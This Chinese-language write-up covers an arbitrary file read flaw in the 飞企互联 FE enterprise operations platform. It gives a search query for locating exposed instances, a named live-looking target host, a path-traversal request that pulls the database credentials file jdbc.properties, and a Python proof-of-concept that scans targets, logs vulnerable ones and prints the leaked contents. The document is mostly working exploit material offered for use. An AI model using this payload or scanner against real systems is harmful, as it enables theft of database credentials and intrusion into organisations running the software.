## 一、资产搜索

```
app="飞企互联-FE企业运营管理平台"
```

## 二、网站测试

```
http://men.zcjtech.com:9090
```

## 三、验证漏洞

```
/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
```

![image-20240914162549475](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914162549475.png)

## 四、POC

```
def poc(target):
    payload = "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "mssql" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"{target}\n")
                    f.close()
                    print(f"[+]{target}存在任意文件读取漏洞")
                    # return True
                print(res2.text)
            else:
                print(f"[-]{target}不存在任意文件读取漏洞")
        else:
            print("连接超时，请手动测试！！！")
    except Exception as e:
        print(e)
```

## 五、测试结果

![image-20240914163828090](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914163828090.png)

![image-20240914163856809](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914163856809.png)

![image-20240914163943974](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914163943974.png)
